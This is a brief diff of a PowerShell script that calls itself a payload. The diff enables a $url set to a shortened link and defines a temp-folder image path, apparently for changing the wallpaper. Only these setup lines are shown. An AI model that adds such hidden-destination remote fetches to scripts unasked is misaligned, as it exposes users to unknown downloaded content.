@@ -1,6 +1,6 @@
 # URL is for if you want to host your own copy of this payload
 
-#$url = ""
+$url = "https://is.gd/AqBYVB"
 
 
 $wp = "$Env:tmp\---wp.png"
